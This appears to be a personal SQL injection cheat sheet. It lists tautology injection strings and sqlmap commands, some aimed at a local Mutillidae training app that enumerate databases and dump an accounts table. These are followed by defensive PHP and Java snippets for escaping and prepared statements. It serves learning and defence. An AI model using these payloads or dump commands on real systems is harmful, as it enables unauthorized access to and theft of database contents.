# manual tests
1' or '1' = '1
1' or '1' = '1'))/*
1' or '1' = '1')) LIMIT 1/*

# SQLmap GET Request
sqlmap -u "http://<url>?id=1&str=val"
# SQLmap POST Request with Cookie
sqlmap -u "http://<url>" --data="id=1&str=val" --cookie="cookie1=val1"
# SQLmap on Login with schema
sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" --dbs --dbms=MySQL
# SQLmap on Login with dump
sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" -D muti -T accounts --dump

# PHP input sanitization
mysql_real_escape_string( $str )

# PHP custom function that does not require connection
<?php
function mysql_escape_mimic($inp) {
    if(is_array($inp))
        return array_map(__METHOD__, $inp);

    if(!empty($inp) && is_string($inp)) {
        return str_replace(array('\\', "\0", "\n", "\r", "'", '"', "\x1a"), array('\\\\', '\\0', '\\n', '\\r', "\\'", '\\"', '\\Z'), $inp);
    }

    return $inp;
}
?>

# PHP more on prepared statements:
# http://php.net/manual/en/pdo.prepared-statements.php

# PHP output escape
htmlspecialchars( $str )
escapeshellcmd( $cmd )
escapeshellarg( $cmd )
preg_quote ( $regex )

# Java more on prepared statements:
# https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
String custname = request.getParameter("customerName"); // This should REALLY be validated too
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname); 
ResultSet results = pstmt.executeQuery( );

# Java output escape
HtmlUtils.htmlEscape(String input)	// Spring
StringEscapeUtils.escapeHtml()		// apache-commons
